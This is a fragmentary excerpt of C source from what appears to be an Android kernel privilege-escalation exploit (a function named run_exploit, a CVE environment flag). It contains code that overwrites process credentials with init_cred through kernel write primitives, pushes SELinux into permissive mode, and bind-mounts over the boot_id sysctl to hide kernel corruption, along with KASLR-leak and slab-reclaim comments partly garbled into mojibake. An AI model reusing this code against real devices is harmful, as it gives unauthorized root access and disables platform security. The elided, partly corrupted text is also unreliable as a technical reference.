...
static int direct_read_shape0_exact64_once(
  ...
  /*
   * Q1 �?KASLR 后的 image/data 地址，Q2 才是 direct-map 地址；因此这�?   * 只要�?Q 为内核指针，具体地址域由两个调用者分别收紧�?   */
  ...
  /* 子进程退出后，父线程必须先回�?CPU7，才能读�?CPU7 �?__entry_task�?*/
  if (!direct_pin_verify_cpu(
...
static void save_boot_id_from_sysctl(void) {
  int fd = open("/proc/sys/kernel/random/boot_id", O_RDONLY | O_CLOEXEC);
  if (fd < 0) {
    pr_warning("save_boot_id: open failed errno=%d\n", errno);
    return;
  }
  char text[64];
  ssize_t n = read(fd, text, sizeof(text) - 1);
  close(fd);
  if (n <= 0) {
    pr_warning("save_boot_id: read failed\n");
    return;
  }
  text[n] = 0;
  /* Save raw text to file for later restore */
  int wf = open("/data/local/tmp/.boot_id_save", O_WRONLY | O_CREAT | O_TRUNC | O_CLOEXEC, 0644);
  if (wf >= 0) {
    write(wf, text, (size_t)n);
    close(wf);
    pr_success("boot_id saved to file: %s\n", text);
  } else {
    pr_warning("save_boot_id: file write failed errno=%d\n", errno);
  }
}
...
static int run_direct_root_stage(void) {
  ...
  if (skip_selinux_zero) {
    if (!direct_trigger_write64(
            "install_cred_only", cred_slot, init_cred, 1, &write_idx)) {
    ...
    /* Restore sysctl boot_id data pointer: point to SYSCTL_BOOTID entry itself
     * (group verified: stext+0x2336f58 is the correct live boot_id address,
     *  stext+0x21f8d48/SLIDE_RANDOM_BOOT_ID_DATA is a dead slot reading 0) */
  {
    uintptr_t sysctl_data_slot = canon_addr(SYSCTL_BOOTID) + SYSCTL_BOOTID_DATA_OFF;
    uintptr_t correct_ptr = canon_addr(SYSCTL_BOOTID);
    pr_success("boot_id pointer restore target slot=%016zx new_ptr=%016zx\n",
               sysctl_data_slot, correct_ptr);
    if (!direct_pselect_write_once(sysctl_data_slot, correct_ptr, 1, 99)) {
      pr_warning("boot_id pointer restore failed\n");
    } else {
      pr_success("boot_id pointer restore ok (pointing to SYSCTL_BOOTID entry)\n");
    }
  }
...
if (!restore_initial_affinity()) {
  ...
  /* Skip policy reload �?root works in permissive, reload breaks apps */
  size_t policy_size = 0;
  (void)policy_size;
    /* Clean up dump directory to free disk space before su install */
  if (system("rm -rf /data/local/tmp/dump") == 0) {
    pr_info("cleaned dump directory to free disk space\n");
  }

if (system("rm -rf /data/local/tmp/dump") == 0) {
    pr_info("cleaned dump directory\n");
  }
  pr_info("skipping selinux policy reload (permissive is sufficient)\n");

  /* boot_id restore: bind-mount correct value over corrupted sysctl */
  {
    char bcmd[512];
    int bfd2 = open("/data/local/tmp/.boot_id_save", O_RDONLY | O_CLOEXEC);
    if (bfd2 >= 0) {
      char bsave[64] = {0};
      ssize_t bsn = read(bfd2, bsave, sizeof(bsave) - 1);
      close(bfd2);
      if (bsn > 0) {
        bsave[bsn] = 0;
        bsave[strcspn(bsave, "\r\n")] = 0;
        pr_success("boot_id attempting bind-mount restore value=%s\n", bsave);
        /* Create a file with the correct boot_id */
        snprintf(bcmd, sizeof(bcmd),
                 "mkdir -p /data/local/tmp/bootfix && "
                 "cp /data/local/tmp/.boot_id_save /data/local/tmp/bootfix/boot_id && "
                 "mount --bind /data/local/tmp/bootfix/boot_id /proc/sys/kernel/random/boot_id 2>/data/local/tmp/bootfix_err.log");
        int bret = system(bcmd);
        pr_success("boot_id bind-mount ret=%d\n", bret);
        if (bret != 0) {
          /* Fallback: try writing via /proc fd trick */
          snprintf(bcmd, sizeof(bcmd),
                   "cat /data/local/tmp/.boot_id_save > /proc/sys/kernel/random/boot_id 2>/data/local/tmp/bootfix_err.log");
          bret = system(bcmd);
          pr_success("boot_id proc write fallback ret=%d\n", bret);
        }
        /* Verify */
        system("cat /proc/sys/kernel/random/boot_id > /data/local/tmp/boot_id_check.txt 2>/dev/null");
      }
    }
  }
  ...
  int root_ok = getuid() == 0 && geteuid() == 0 && id_ok && su_ok &&
                (skip_selinux_zero || enforcing_after == 0);
...
int run_exploit(int argc, char **argv) {
  skip_selinux_zero = getenv("CVE_NO_PERMISSIVE") != NULL;
  if (skip_selinux_zero) pr_info("CVE_NO_PERMISSIVE set - skipping SELinux zero\n");
  disable_rseq_for_thread();
  set_unbuffer();
  set_limit();
  (void)argc;
  ...
  /*
   * slide �?skb 已经被子进程消费，KASLR 也已读回；在父进程中释放本代
   * reclaim socket 与残�?mm pin，避�?direct worker 只关闭继承副本�?   * 而父进程仍把�?partial slab 保活�?   */
